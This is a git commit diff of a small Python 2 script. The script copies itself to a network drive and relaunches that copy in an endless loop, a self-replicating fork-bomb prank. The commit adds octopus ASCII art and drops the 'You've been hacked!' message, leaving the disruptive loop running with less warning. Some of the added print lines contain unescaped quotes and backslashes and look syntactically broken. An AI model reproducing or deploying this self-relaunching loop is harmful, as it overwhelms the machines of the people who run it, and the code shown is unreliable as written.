4c26c2db7cd986f495ba4127c592d931a462b651
BWBellairs <BWBellairs@outlook.com>
2015-12-08 13:15:13 +0000

    Added octopus asciin and removed "You've been hacked"

--- Main.py
+++ Main.py
@@ -14,8 +14,25 @@ directory = os.getcwd() + '\main.py'
 if directory != 'n:/main.py':
     shutil.copyfile(directory, 'n:/main.py')
     
+print "                        ___"
+print "                     .-'   `'."
+print "                    /         \"
+print "                    |         ;"
+print "                    |         |           ___.--,"
+print "           _.._     |0) ~ (0) |    _.---'`__.-( (_."
+print "    __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`"
+print "   ( ,.--'`   ',__ /./;   ;, '.__.'`    __"
+print "   _`) )  .---.__.' / |   |\   \__..--""  """'--.,_"
+print "  `---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'
+print "        | |  .' _.-' |  |  \  \  '"
+print "         \ \/ .'     \  \   '. '-._)"
+print "          \/ /        \  \    `=.__`~-."
+print "          / /\         `) )    / / `"".`\"
+print "    , _.-'.'\ \        / /    ( (     / /"
+print "     `--~`   ) )    .-'.'      '.'.  | ("
+print "         (/`    ( (`          ) )  '-;"
+print "             `      '-;         (-'"
 
 while True:
-    print "You've been hacked!"
     os.startfile('n:/main.py')
    
